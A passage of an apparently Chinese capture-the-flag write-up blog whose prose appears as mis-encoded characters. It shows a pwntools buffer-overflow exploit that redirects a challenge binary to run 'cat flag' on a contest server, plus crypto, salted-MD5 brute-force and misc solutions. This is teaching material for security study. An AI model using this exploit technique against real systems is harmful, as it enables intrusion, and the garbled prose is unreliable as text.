data-src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" class="lazyload"></p><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªwin_funcå‡½æ•°ï¼ŒçŒœæµ‹åŒæ ·æ˜¯åˆ©ç”¨è¿”å›åˆ°è¯¥å‡½æ•°ä»è€Œå¾—åˆ°flagï¼Œé‚£ä¹ˆå¦‚ä½•è¿”å›åˆ°è¿™ä¸ªwin_funcå‡½æ•°å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ³¨æ„åˆ°mem_testå‡½æ•°ä¼ªcä»£ç å¦‚ä¸‹:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" class="lazyload"></p><p>ç›´æ¥<code>return result</code>ï¼Œé‚£ä¹ˆå¦‚æœæœ‰æº¢å‡ºå­˜åœ¨ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½è¦†ç›–æ‰è¿™ä¸ªå‡½æ•°çš„è¿”å›åœ°å€å‘¢ï¼Œé‚£å½“ç„¶æ˜¯å¯è¡Œçš„(è¿™é¢˜ä¸èƒ½ç›´æ¥ç”¨pattern createå¾—åˆ°åç§»é‡ï¼Œå¦‚æœpatternè¿‡å¤§åˆ™ä¼šå¯¼è‡´æ— æ³•è¦†ç›–eipï¼‰ï¼Œç”¨gdbåœ¨mem_testå‡½æ•°ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" class="lazyload"></p><p>ç„¶åæ ¹æ®ä¹‹å‰idaåˆ†æå˜é‡sçš„ä½ç½®ä¸º<code>ebp-0x13</code>,æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨gdbçœ‹ebpçš„å€¼ï¼Œå¯ä»¥çŸ¥é“<code>0x8048718</code>å°±æ˜¯returnè¿”å›çš„åœ°å€ã€‚æˆ‘ä»¬éœ€è¦å°†å®ƒè¦†ç›–æˆwin_funcçš„åœ°å€ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" class="lazyload"></p><p>è€Œcatflagåœ°å€å°±æ˜¯ä¸€å¼€å§‹è¾“å‡ºçš„é‚£ä¸ªhint:<code>0x080487E0</code></p></blockquote><p>æ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#paddingç”±æ ˆç©ºé—´å’Œebp(0x13+4)ç»„æˆï¼Œsystem('cat flag')ç”±systemå‡½æ•°å’Œcatflagå‚æ•°ä»¥åŠsystemè¿”å›åœ°å€ç»„æˆ</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" class="lazyload"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"><a href="#Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚" class="headerlink" title="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"></a>Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚</h3><blockquote><p>é¢˜é¢æœ‰ä¸€ä¸²base64ï¼šVTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>è¿ç»­è§£ç å³å¯å¾—åˆ°ï¼šSK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "><a href="#Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç " class="headerlink" title="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "></a>Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç </h3><blockquote><p>æ®è¯´æ˜¯æŸå¹³å°åŸé¢˜ï¼Œç”šè‡³ä¸“é—¨å»æŸ¥äº†ä¸€ä¸‹äºŒæˆ˜æ—¶æœŸçš„å¯†ç å­¦ï¼Œé¢˜é¢ï¼š</p><pre class=" language-c"><code class="language-c">å·²çŸ¥å°†ä¸€ä¸ªflagä»¥ä¸€ç§åŠ å¯†å½¢å¼ä¸ºä½¿ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œä½¿ç”¨å¯†é’¥WELCOMETOCFFåŠ å¯†åå¯†æ–‡ä¸º<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>ï¼Œè¯·åˆ†æå‡ºflag</code></pre><p>WELCOMETOCFFä¸ºå¯†é’¥ï¼Œé•¿åº¦ä¸º12ï¼Œè€ŒäºŒè¿›åˆ¶ä¸²é•¿åº¦ä¸º84ï¼Œæ—¢ç„¶å¯†æ–‡ä¸ºäºŒè¿›åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åˆ°çš„æ¯”è¾ƒç®€å•çš„åŠ å¯†æ“ä½œå°±æ˜¯æŒ‰ä½ä¸ï¼ŒæŒ‰ä½æˆ–ï¼Œä»¥åŠæŒ‰ä½å¼‚æˆ–ã€‚</p><p>å°è¯•åå‘ç°æ˜¯å¼‚æˆ–æ“ä½œï¼Œå°†WELCOMETOCFFï¼Œåˆ†åˆ«ç”¨ä¸ƒä½äºŒè¿›åˆ¶è¡¨ç¤ºå…¶åœ¨å­—æ¯è¡¨ä¸­çš„é¡ºåºï¼Œå¹¶ä¸”æ¯å¯¹åº”çš„ä¸ƒä½è¿›è¡Œå¼‚æˆ–æ“ä½œï¼š</p><pre class=" language-c"><code class="language-c">å¯†æ–‡<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XORå¯†é’¥W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>å¾—åˆ°ï¼š<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "><a href="#Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç " class="headerlink" title="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "></a>Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç </h3><blockquote><p>æ‘©æ–¯ç”µç è§£ç å³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" class="lazyload"></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼"><a href="#Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼" class="headerlink" title="Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼"></a>Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼</h3><blockquote><p>æ ¹æ®é¢˜é¢ï¼Œå°è¯•è¿›è¡Œå¯¹è¯·æ±‚ç±»å‹è¿›è¡Œè¿‡æ»¤ï¼Œå‘ç°POSTè¯·æ±‚åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”æœ‰useridå’Œpswrdï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" class="lazyload"></p><p>å°è¯•å°†pswrdçš„å€¼è§£ç åæäº¤flagï¼ŒæˆåŠŸã€‚</p></blockquote><h3 id="Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º"><a href="#Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º" class="headerlink" title="Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)"></a>Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)</h3><blockquote><p>ç»™å‡ºä¸€ä¸²å­—ç¬¦<code>js4163633181327481</code></p><p>å®Œå…¨è„‘æ´é¢˜ï¼šæ‰‹æœºä¹é”®<code>4163633181327481</code>ï¼Œæ²¡ç”¨è¿‡çš„å’‹æ´»ã€‚ã€‚ã€‚</p></blockquote><h3 id="Crypto6-è¶…çº§å¯†ç "><a href="#Crypto6-è¶…çº§å¯†ç " class="headerlink" title="Crypto6-è¶…çº§å¯†ç "></a>Crypto6-è¶…çº§å¯†ç </h3><blockquote><p>è¿™é¢˜ç»™å‡ºäº†å¤§é‡çš„md5å€¼ï¼Œä»¥åŠç±»ä¼¼äºbase64æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°hashåŠ ç›(salt)çš„é—®é¢˜ï¼Œè€Œä¸”éšçº¦è®°å¾—ä¹‹å‰åœ¨å“ªçœ‹åˆ°è¿‡è¿™ä¸ªé¢˜ã€‚</p><p>è„šæœ¬çˆ†ç ´ï¼ˆæ—¶é—´åŸå› ï¼Œç›´æ¥ä»1234567880å¼€å§‹ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" class="lazyload"></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-ä¼šé£çš„ç‹—ç‹—"><a href="#Misc1-ä¼šé£çš„ç‹—ç‹—" class="headerlink" title="Misc1-ä¼šé£çš„ç‹—ç‹—"></a>Misc1-ä¼šé£çš„ç‹—ç‹—</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" class="lazyload"></p><p>ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹å¯ä»¥å¾—åˆ°æœ«å°¾çš„base64å­—ç¬¦ä¸²ï¼Œæ¥è§£ç å¾—åˆ°flag</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" class="lazyload"></p><h3 id="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"><a href="#Misc2-æ–‡ä»¶ç±»å‹åˆ†æ" class="headerlink" title="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"></a>Misc2-æ–‡ä»¶ç±»å‹åˆ†æ</h3><blockquote><p>å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œç‚¹å¼€æ¥çœ‹çœ‹ï¼Œå­˜åœ¨[content-types].xmlæ–‡ä»¶ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯å¾®è½¯å…¬å¸officeå¥—ä»¶çš„æ ¼å¼ã€‚ç®€å•è¯•è¿‡docï¼Œdocxï¼Œpptï¼Œpptxï¼Œxlsï¼Œxlxsæ²¡ç”¨ä¹‹åï¼ŒæŸ¥åˆ°xpsï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" class="lazyload"></p><p>äºæ˜¯æ”¹ä¸ºxpsæ–‡ä»¶åç¼€å³å¯ï¼Œå°†xpsæäº¤ã€‚</p></blockquote><h3 id="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"><a href="#Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š" class="headerlink" title="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"></a>Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š</h3><blockquote><p>ç®€å•çš„ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œä¿®æ”¹å…¨å±€åŠ å¯†æ ‡å¿—ä½ï¼Œå°†å¥‡æ•°æ”¹ä¸ºå¶æ•°å³å¯ã€‚</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-è¯±äººçš„éŸ³ä¹"><a href="#Misc4-è¯±äººçš„éŸ³ä¹" class="headerlink" title="Misc4-è¯±äººçš„éŸ³ä¹"></a>Misc4-è¯±äººçš„éŸ³ä¹</h3><blockquote><p>è¿™é¢˜çš„éŸ³é¢‘æ–‡ä»¶ä¸­å­˜åœ¨ä¸€æ®µæ‘©æ–¯ç”µç ï¼ˆæœ‰çš„åŒå­¦é€šè¿‡äºŒè¿›åˆ¶getflagï¼‰ï¼Œé€šè¿‡éŸ³é¢‘åˆ†æè½¯ä»¶å¯ä»¥å°†å…¶æå–å‡ºæ¥ï¼š</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#ä¸€æ¬¡æ€§è§£ç è¡Œä¸é€šï¼Œå¯ä»¥å°†å…¶åˆ†ä¸ºä¸‰æ®µåˆ†åˆ«è§£ç å¹¶ä¸”å°†ä¸‰ä¸ªéæ­£å¸¸å­—ç¬¦è½¬ä¸º16è¿›åˆ¶ï¼š</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token 